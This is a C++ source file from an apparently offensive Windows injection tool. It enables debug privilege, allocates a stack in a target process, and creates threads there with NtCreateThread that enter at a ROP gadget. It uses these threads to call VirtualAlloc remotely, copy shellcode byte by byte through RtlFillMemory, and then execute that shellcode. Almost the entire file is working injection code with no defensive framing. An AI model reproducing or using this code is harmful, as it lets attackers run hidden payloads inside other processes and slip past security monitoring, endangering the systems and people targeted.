#include "NtCreateThreadUtil.h"
#include "GadgetUtil.h" // For GadgetInfo, FindUniquePushPushRetGadget, SetRegisterContextValue
#include <iostream>     // For std::cerr, std::cout

bool EnableDebugPrivilege()
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        std::cerr << "[!] OpenProcessToken failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
    {
        std::cerr << "[!] LookupPrivilegeValue failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        std::cerr << "[!] AdjustTokenPrivileges failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        std::cerr << "[!] Warning: SeDebugPrivilege could not be enabled. Process might lack the right." << std::endl;
    }

    CloseHandle(hToken);
    return true;
}

bool AllocateRemoteStack(HANDLE hProcess, SIZE_T stackSize, PVOID *pStackBase, PVOID *pStackLimit)
{
    *pStackBase = nullptr;
    *pStackLimit = nullptr;

    // Allocate memory for the stack in the target process
    // Stack grows downwards, so Limit is the lower address (base of allocation)
    // Base is the higher address (top of the stack initially)
    PVOID pAlloc = VirtualAllocEx(
        hProcess,
        NULL,                     // Let system choose address
        stackSize,                // Size of the stack
        MEM_COMMIT | MEM_RESERVE, // Allocation type
        PAGE_READWRITE            // Memory protection
    );

    if (pAlloc == NULL)
    {
        std::cerr << "[!] VirtualAllocEx failed to allocate remote stack. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Limit is the starting address of the allocation
    *pStackLimit = pAlloc;
    // Base is the end address of the allocation (highest address)
    *pStackBase = (PVOID)((ULONG_PTR)pAlloc + stackSize);

    return true;
}

bool PrepareInitialTeb(PINITIAL_TEB pInitialTeb, PVOID pStackBase, PVOID pStackLimit)
{
    if (!pInitialTeb || !pStackBase || !pStackLimit)
        return false;

    ZeroMemory(pInitialTeb, sizeof(INITIAL_TEB));
    // Set the stack limits for the new thread's TEB
    pInitialTeb->StackBase = pStackBase;
    pInitialTeb->StackLimit = pStackLimit;
    // Other TEB fields initialized by kernel

    return true;
}

bool PrepareThreadContext(PCONTEXT pContext, PVOID pStartAddress, PVOID pStackBase)
{
    if (!pContext || !pStartAddress || !pStackBase)
        return false;

    // Get a valid context template first using the current thread
    ZeroMemory(pContext, sizeof(CONTEXT));
    pContext->ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(GetCurrentThread(), pContext))
    {
        std::cerr << "[!] GetThreadContext failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Set the Instruction Pointer (where the thread starts)
#ifdef _WIN64
    pContext->Rip = (DWORD64)pStartAddress;
#else
    pContext->Eip = (DWORD)pStartAddress;
#endif

    // Set the Stack Pointer (to the top of our allocated stack)
    // Stack grows downwards, so RSP/ESP should point to the highest address (StackBase) initially
#ifdef _WIN64
    pContext->Rsp = (DWORD64)pStackBase;
#else
    pContext->Esp = (DWORD)pStackBase;
#endif

    // Ensure control flags are properly set
    pContext->ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS;

    return true;
}

// Create a remote thread via NtCreateThread to execute a ROP gadget
bool CreateRemoteThreadViaGadgetWithNtCreateThread(
    HANDLE processHandle,
    const GadgetInfo &ropGadget,
    DWORD64 arg1,
    DWORD64 arg2,
    DWORD64 arg3,
    DWORD64 arg4,
    DWORD64 functionAddress,
    DWORD64 exitThreadAddr,
    SIZE_T stackSize = 1024 * 1024)
{
    // Check if NtCreateThread is available
    if (!pNtCreateThread)
    {
        std::cerr << "[!] NtCreateThread function pointer not available. Function may not exist on this system." << std::endl;
        return false;
    }

    // Allocate a stack for the new thread
    PVOID stackBase = nullptr;
    PVOID stackLimit = nullptr;
    if (!AllocateRemoteStack(processHandle, stackSize, &stackBase, &stackLimit))
    {
        std::cerr << "[!] Failed to allocate stack in target process." << std::endl;
        return false;
    }

    // Prepare the thread's initial TEB
    INITIAL_TEB initialTeb = {0};
    if (!PrepareInitialTeb(&initialTeb, stackBase, stackLimit))
    {
        std::cerr << "[!] Failed to prepare InitialTeb." << std::endl;
        return false;
    }

    // Prepare the thread's context, setting the entry point to the ROP gadget
    CONTEXT threadContext = {0};
    ZeroMemory(&threadContext, sizeof(CONTEXT));
    threadContext.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(GetCurrentThread(), &threadContext))
    {
        std::cerr << "[!] GetThreadContext failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Set RIP to point to the gadget address
    threadContext.Rip = reinterpret_cast<DWORD64>(ropGadget.address);
    threadContext.Rsp = reinterpret_cast<DWORD64>(stackBase);

    // Set up the registers for the ROP gadget
    if (!SetRegisterContextValue(threadContext, ropGadget.regId1, exitThreadAddr))
    {
        std::cerr << "[!] Failed to set register 1 for ROP gadget." << std::endl;
        return false;
    }
    if (!SetRegisterContextValue(threadContext, ropGadget.regId2, functionAddress))
    {
        std::cerr << "[!] Failed to set register 2 for ROP gadget." << std::endl;
        return false;
    }

    // Set function arguments in registers
    threadContext.Rcx = arg1;
    threadContext.Rdx = arg2;
    threadContext.R8 = arg3;
    threadContext.R9 = arg4;

    // Set control flags
    threadContext.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS;

    // Create the thread using NtCreateThread
    HANDLE hThread = NULL;
    CLIENT_ID clientId = {0};

    NTSTATUS status = pNtCreateThread(
        &hThread,          // Output thread handle
        THREAD_ALL_ACCESS, // Desired access
        NULL,              // ObjectAttributes
        processHandle,     // Target process handle
        &clientId,         // Output client ID
        &threadContext,    // Initial context (registers)
        &initialTeb,       // Initial TEB (stack info)
        FALSE              // CreateSuspended = FALSE
    );

    if (status != STATUS_SUCCESS)
    {
        std::cerr << "[!] NtCreateThread failed with status: 0x" << std::hex << status << std::dec << std::endl;
        return false;
    }

    // Wait for thread to complete and clean up
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return true;
}

// Main function for shellcode injection using NtCreateThread with ROP gadget
bool InjectShellcodeUsingNtCreateThread(
    HANDLE hProcess,
    const std::vector<unsigned char> &shellcodeBytes,
    SIZE_T allocSize,
    DWORD allocPerm,
    bool verbose)
{
    // 1. Find a ROP gadget just like in CreateRemoteThread approach
    GadgetInfo gadget = FindUniquePushPushRetGadget(hProcess);
    if (gadget.address == nullptr)
    {
        std::cerr << "[!] Failed to find a suitable ROP gadget in the target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (verbose)
    {
        std::cout << "[*] Found ROP gadget at address: " << gadget.address << std::endl;
    }

    // 2. Get necessary function addresses
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32)
    {
        std::cerr << "[!] Failed to get kernel32.dll handle. Error: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
    LPVOID pExitThread = GetProcAddress(hKernel32, "ExitThread");
    LPVOID pRtlMoveMemory = GetProcAddress(hKernel32, "RtlMoveMemory"); // Keep for now, might be used elsewhere or for reference
    LPVOID pRtlFillMemory = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlFillMemory");


    if (!pVirtualAlloc || !pExitThread || !pRtlFillMemory) // Changed pRtlMoveMemory to pRtlFillMemory
    {
        std::cerr << "[!] Failed to get necessary function addresses. Error: " << GetLastError() << std::endl;
        return false;
    }

    DWORD64 exitThreadAddr = reinterpret_cast<DWORD64>(pExitThread);

    if (verbose)
    {
        std::cout << "[*] Function addresses obtained:"
                  << "\n    VirtualAlloc: " << pVirtualAlloc
                  << "\n    ExitThread: " << pExitThread
                  << "\n    RtlFillMemory: " << pRtlFillMemory << std::endl; // Changed
    }

    // 3. Allocate memory for shellcode using NtCreateThread + ROP gadget
    DWORD64 ALLOC_SIZE = allocSize;
    DWORD64 ALLOC_TYPE = MEM_COMMIT | MEM_RESERVE;
    DWORD64 ALLOC_PROTECT = allocPerm;
    DWORD64 REQUESTED_ALLOC_ADDR = 0x60000; // Same address as in ROP gadget method

    bool allocSuccess = CreateRemoteThreadViaGadgetWithNtCreateThread(
        hProcess,
        gadget,
        REQUESTED_ALLOC_ADDR, ALLOC_SIZE, ALLOC_TYPE, ALLOC_PROTECT,
        reinterpret_cast<DWORD64>(pVirtualAlloc),
        exitThreadAddr);

    if (!allocSuccess)
    {
        std::cerr << "[!] Failed to allocate memory in the target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (verbose)
    {
        std::cout << "[*] Successfully allocated memory at address: 0x" << std::hex
                  << REQUESTED_ALLOC_ADDR << std::dec
                  << " with size: " << ALLOC_SIZE << " bytes" << std::endl;
    }

    // 4. Copy shellcode byte-by-byte using RtlFillMemory and ROP gadget
    for (size_t i = 0; i < shellcodeBytes.size(); ++i)
    {
        unsigned char byteToFill = shellcodeBytes[i];

        bool copySuccess = CreateRemoteThreadViaGadgetWithNtCreateThread(
            hProcess,
            gadget,
            REQUESTED_ALLOC_ADDR + i,                  // Destination (PVOID Destination)
            1,                                         // Length (SIZE_T Length)
            static_cast<DWORD64>(byteToFill),          // Fill (int Fill) - RCX, RDX, R8
            0,                                         // Unused
            reinterpret_cast<DWORD64>(pRtlFillMemory), // Function to call
            exitThreadAddr);

        if (!copySuccess && verbose)
        {
            std::cerr << "[!] Warning: Failed to fill byte at index " << i << std::endl;
        }
    }

    if (verbose)
    {
        std::cout << "[*] Successfully copied " << shellcodeBytes.size()
                  << " bytes of shellcode to the target process" << std::endl;
    }

    // 5. Execute the shellcode
    bool execSuccess = CreateRemoteThreadViaGadgetWithNtCreateThread(
        hProcess,
        gadget,
        0, 0, 0, 0,
        REQUESTED_ALLOC_ADDR, // Address of shellcode to execute
        exitThreadAddr);

    if (!execSuccess)
    {
        std::cerr << "[!] Failed to execute shellcode. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (verbose)
    {
        std::cout << "[*] Successfully executed shellcode" << std::endl;
    }

    return true;
}

// Legacy function, preserved for compatibility - redirects to the correct approach
bool CreateThreadViaNtCreateThread(
    HANDLE hProcess,
    LPVOID functionAddress,
    DWORD64 arg1,
    DWORD64 arg2,
    DWORD64 arg3,
    DWORD64 arg4,
    SIZE_T stackSize)
{
    // This function has been replaced by CreateRemoteThreadViaGadgetWithNtCreateThread
    // which properly implements the ROP gadget technique
    std::cerr << "[!] CreateThreadViaNtCreateThread is deprecated. Use CreateRemoteThreadViaGadgetWithNtCreateThread instead." << std::endl;
    return false;
}

// Legacy function redirectors - all now use the ROP gadget approach
LPVOID AllocateMemoryViaNtCreateThread(HANDLE hProcess, DWORD64 baseAddress, SIZE_T size, DWORD allocType, DWORD protect)
{
    std::cerr << "[!] AllocateMemoryViaNtCreateThread is deprecated. Use CreateRemoteThreadViaGadgetWithNtCreateThread instead." << std::endl;
    return nullptr;
}

bool PerformRemoteMemoryCopyViaNtCreateThread(HANDLE processHandle, LPVOID memCopyAddress, DWORD64 destinationAddress, const unsigned char *sourceData, size_t dataSize)
{
    std::cerr << "[!] PerformRemoteMemoryCopyViaNtCreateThread is deprecated. Use CreateRemoteThreadViaGadgetWithNtCreateThread instead." << std::endl;
    return false;
}

bool ExecuteShellcodeViaNtCreateThread(HANDLE processHandle, LPVOID shellcodeAddress)
{
    std::cerr << "[!] ExecuteShellcodeViaNtCreateThread is deprecated. Use CreateRemoteThreadViaGadgetWithNtCreateThread instead." << std::endl;
    return false;
}
